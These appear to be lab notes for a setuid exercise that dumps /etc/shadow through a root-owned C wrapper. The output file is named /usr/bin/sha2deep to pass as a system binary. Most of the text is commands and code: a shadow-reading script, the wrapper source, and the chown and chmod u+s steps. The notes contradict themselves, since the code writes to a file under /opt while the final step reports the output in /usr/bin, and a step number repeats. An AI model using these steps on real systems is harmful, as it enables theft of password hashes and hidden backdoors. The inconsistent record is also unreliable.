#privilege-escalation-setuid-binary

## 1. Chose a file to target
```bash
/etc/shadow
```
decided to select shadow
 
## 2. Chose output directory/filename
```bash
/usr/bin/sha2deep
```
Output masquerading as legitimate blending in with normal system filenames in /usr/bin

## 3. Create script:
```bash
#!/bin/bash
cat /etc/shadow > /usr/bin/sha2deep
```
Ran as normal user; permission denied as expected

## 4. Write the C wrapper
```bash
vim wrapper.c
```
```c
#include <unistd.h>
#include <fcntl.h>

int main() {
    int fd = open("/opt/secure_test/shadow_output.txt", O_WRONLY | O_CREAT | O_TRUNC, 0600);
    dup2(fd, STDOUT_FILENO);
    close(fd);

    char *args[] = {"/bin/cat", "/etc/shadow", NULL};
    execve("/bin/cat", args, NULL);
    return 0;
}
```

## 4. Compile
```bash
gcc wrapper.c -o wrapper
```

## 5. Set ownership and setuid bit
```bash
sudo chown root:root wrapper
sudo chmod u+s wrapper
```

## 6. Verify the setuid bit
```bash
ls -l wrapper
```
Output: `-rwsrwxr-x`

## 7. Run it
```bash
./wrapper
```
Ran with normal user privileges. Successfully wrote `/etc/shadow` output to `/usr/bin/sha2deep`, `cat` to verify.
